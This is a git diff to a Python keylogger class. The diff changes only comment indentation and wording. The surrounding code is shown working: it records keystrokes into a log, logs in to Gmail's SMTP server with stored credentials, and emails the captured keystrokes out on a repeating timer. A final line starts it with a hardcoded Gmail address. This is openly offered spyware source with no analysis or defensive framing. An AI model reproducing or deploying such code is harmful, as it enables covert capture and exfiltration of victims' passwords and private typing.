@@ -15,7 +15,7 @@ class Keylogger:
         self.password = password
         self.interval = time_interval
         
-        # optional: get computer information
+# optional: get computer information
         '''
         x = os.uname()
         f"keylogger start running \n" + f"operating system name: {x.sysname}\n" + f"name of machine: {x.nodename}\n" + f"hardware identifier: {x.machine}\n"
@@ -44,15 +44,15 @@ class Keylogger:
                 x = '#'
         current_key = x
         
-        # adding key to self.log 
+# adding key to self.log 
         self.append_to_log(current_key)
     
     def sending_mail(self):
-        # if press f15 exit program 
+# if press f15 exit program 
         if self.exit == True:
               sys.exit()
         
-        # implementing email sender
+# implementing email sender
         server = smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()
         server.login(self.email_from, self.password)
@@ -60,7 +60,7 @@ class Keylogger:
         server.quit()
         self.log = ' '
         
-        # create thread starting every self.interval 
+# create another thread 
         timer = threading.Timer(self.interval, self.sending_mail)
         timer.start()
         timer.join()
@@ -70,6 +70,7 @@ class Keylogger:
         with listener:
             self.sending_mail()
             listener.join()
-     
+
+# start      
 g = Keylogger(20,"k23574745@gmail.com",MAIL,PASSWORD)
 g.start()
